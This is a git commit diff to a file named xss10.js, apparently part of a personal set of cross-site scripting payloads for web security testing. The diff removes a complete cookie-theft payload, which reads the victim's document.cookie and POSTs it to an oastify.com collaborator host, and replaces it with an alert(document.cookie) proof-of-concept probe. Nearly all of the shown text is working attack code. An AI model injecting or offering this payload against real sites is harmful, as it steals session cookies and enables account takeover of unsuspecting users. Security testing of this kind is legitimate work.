5d6058ea15c74ad0d3c032a9618b9f4a3606026f
Jay3shh <jayesh921@gmail.com>
2023-09-06 13:09:50 +0530

    Update xss10.js

--- xss10.js
+++ xss10.js
@@ -1,18 +1,1 @@
-var victimCookies=document.cookie
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://c5ipsqn5kagwttzload2roepngt7hx5m.oastify.com", true);
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-xhr.onreadystatechange = function() {
-  if (xhr.readyState === 4 && xhr.status === 200) {
-    var response = xhr.responseText;
-    console.log(response);
-    // Process the response data here
-  } else if (xhr.readyState === 4) {
-    console.log('Request failed with status code:', xhr.status);
-    // Handle any errors that occur during the request
-  }
-};
-
-var requestBody = "cookies=" + victimCookies;
-xhr.send(requestBody);
+alert(document.cookie)
